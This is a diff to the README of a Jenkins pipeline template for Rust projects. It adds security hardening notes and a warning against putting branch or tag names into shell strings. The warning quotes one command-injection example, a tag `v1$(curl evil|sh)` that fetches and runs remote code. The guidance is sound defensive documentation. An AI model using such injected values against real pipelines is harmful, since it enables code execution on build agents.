@@ -29,7 +29,7 @@ cp templates/jenkins/Jenkinsfile ./Jenkinsfile
 - ✅ Build & Test
 - ✅ Parallel test execution
 - ✅ Format & Clippy checks
-- ✅ Security audit
+- ✅ Security audit (`cargo audit`, blocking)
 - ✅ Docker build
 - ✅ Workspace cleanup
 
@@ -37,7 +37,9 @@ cp templates/jenkins/Jenkinsfile ./Jenkinsfile
 
 - ✅ No local Rust installation required
 - ✅ Alpine-based build container
-- ✅ Cached cargo registry volume
+- ✅ Pinned (tag + digest) build image
+- ✅ Per-job cargo cache (no registry volume shared between jobs)
+- ✅ Blocking lint and `cargo audit` stages
 - ✅ Static musl binary output
 - ✅ Artifact archiving
 
@@ -49,6 +51,14 @@ cp templates/jenkins/Jenkinsfile ./Jenkinsfile
 - ✅ Tags → Production (with approval)
 - ✅ Helm deployment examples
 - ✅ Slack notifications (commented)
+- ✅ Branch/tag names validated and passed to the shell only via `withEnv`
+  into single-quoted `sh '...'` steps
+
+> **Never** interpolate `BRANCH_NAME`, `TAG_NAME`, `JOB_NAME` or other
+> pusher-controlled values into a Groovy string that becomes a shell command
+> (`sh "docker build -t app:${env.TAG_NAME} ."`). A tag such as
+> `v1$(curl evil|sh)` would execute on the agent. Pass them as environment
+> variables and quote them in a single-quoted `sh '...'` block instead.
 
 ## Requirements
 
